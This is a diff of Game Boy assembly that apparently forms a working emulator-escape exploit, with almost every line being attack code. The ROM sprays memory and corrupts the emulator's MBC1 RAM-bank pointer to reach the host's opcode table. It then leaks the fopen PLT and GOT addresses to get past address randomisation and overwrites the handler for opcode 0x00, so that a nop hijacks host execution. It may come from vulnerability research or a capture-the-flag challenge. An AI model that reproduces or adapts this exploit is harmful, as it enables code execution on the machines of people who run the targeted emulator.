@@ -39,29 +39,173 @@
     ; u are a
     .byte $61
 
+.macro memset args dst, val, count
+    ld hl, dst
+    ld a, val
+    ld c, count
+    call _memset
+.endm
+
+.macro memcpy args dst, src, count
+    ld de, dst
+    ld hl, src
+    ld c, count
+    call _memcpy
+.endm
+
+.macro memcpy_8 args dst, src
+    ld de, dst
+    ld hl, src
+    call _memcpy_8
+.endm
+
+.macro ptr8_add args dst, src
+    ld de, dst
+    ld hl, src
+    call _ptr8_add
+.endm
+
+.macro sub_ptr_3 args dst, b2, b1, b0
+    ld hl, dst
+
+    ld a, (hl)
+    sub a, b0
+    ld (hl+), a
+
+    ld a, (hl)
+    sbc a, b1
+    ld (hl+), a
+
+    ld a, (hl)
+    sbc a, b2
+    ld (hl), a
+.endm
+
+.macro add_ptr_3 args dst, b2, b1, b0
+    ld hl, dst
+
+    ld a, (hl)
+    add a, b0
+    ld (hl+), a
+
+    ld a, (hl)
+    adc a, b1
+    ld (hl+), a
+
+    ld a, (hl)
+    adc a, b2
+    ld (hl+), a
+
+    ld a, (hl)
+    adc a, 0
+    ld (hl+), a
+
+    ld a, (hl)
+    adc a, 0
+    ld (hl+), a
+.endm
+
 .org $200
 main:
-    ; Subtract 0x61e10 from ptr MBC1MemoryRule::m_pRAMBanks.
-    ; Make it point into the Processor table.
-    ld a, ($D9C8)
-    sub a, 0x10
-    ld ($D9C8), a
-    ld a, ($D9C9)
-    sbc a, 0x1e
-    ld ($D9C9), a
-    ld a, ($D9CA)
-    sbc a, 0x06
-    ld ($D9CA), a
+    ; Spray pattern
+    ld a, $41
+    ld hl, $8020
+    ld c, 9
+-   ld (hl+), a
+    dec c
+    jp nz, -
 
-    ; Corrupt Processor::OPCode0x00
-    ld a, $FF
-    ld ($a000), a
-    ld ($a001), a
-    ld ($a002), a
-    ld ($a002), a
+    ; Backup ptr MBC1MemoryRule::m_pRAMBanks.
+    memcpy_8 $8000 $d9c8
+
+    ; Subtract 0x61e10 from ptr MBC1MemoryRule::m_pRAMBanks,
+    ; to map a000..c000 to buffer Processor::m_Opcodes.
+    sub_ptr_3 $D9C8 $06 $1e $10
+
+    ; Save Processor::OPCode0x00
+    memcpy_8 $8008 $d9c8
+    memcpy_8 $8010 $a000
+
+    ; Restore ptr MBC1MemoryRule::m_pRAMBanks.
+    ;memcpy_8 $d9c8 $8000
+    ;ld ($a000), a
+
+    ; Leak fopen PLT entry
+    sub_ptr_3 $8010 $01 $27 $d0
+    memcpy_8 $d9c8 $8010
+    ld a, ($a000) ; sanity check
+
+    ; Leak fopen GOT entry PLT->GOT offset
+    memcpy $8018 $a007 4
+    memset $801c $00 4
+
+    ; Leak fopen GOT entry
+    add_ptr_3 $8018 $00 $00 $0b ; rip adjust
+    ptr8_add $8018 $8010
+
+    ; Map fopen
+    memcpy_8 $d9c8 $8018
+
+    ; Restore buffer Processor::m_Opcodes.
+    memcpy_8 $d9c8 $8008
+
+    ; Set opcode 0x00 to fopen
+    memcpy_8 $a000 $8018
+
+    ; Restore ptr MBC1MemoryRule::m_pRAMBanks.
+    memcpy_8 $d9c8 $8000
 
     ; Redirect code execution
     nop           ; opcode=00
 
 halt:
     jp halt
+
+; memcpy_8 copies 8 bytes from source to destination.
+_memcpy_8:
+    ld c, $8
+    jp _memcpy
+
+; memcpy copies bytes from source to destination.
+; de = destination address
+; hl = source address
+; b  = byte count
+_memcpy:
+    inc c
+    jp +
+-   ld a, (hl+)
+    ld (de), a
+    inc de
++   dec c
+    jp nz, -
+    ret
+
+; memset fills a range in memory with a specified byte value.
+; hl = destination address
+; c = byte count
+; a = byte value
+_memset:
+    inc c
+    jr +
+-   ld [hl+], a
++   dec c
+    jr nz, -
+ret
+
+; de = destination address
+; hl = source address
+_ptr8_add:
+    ; clear carry flag
+    scf
+    ccf
+    ; add pointer
+    ld c, 9
+-   dec c
+    ld a, (de)
+    ld b, a
+    ld a, (hl+)
+    adc a, b
+    ld (de), a
+    inc de
+    jp nz, -
+    ret
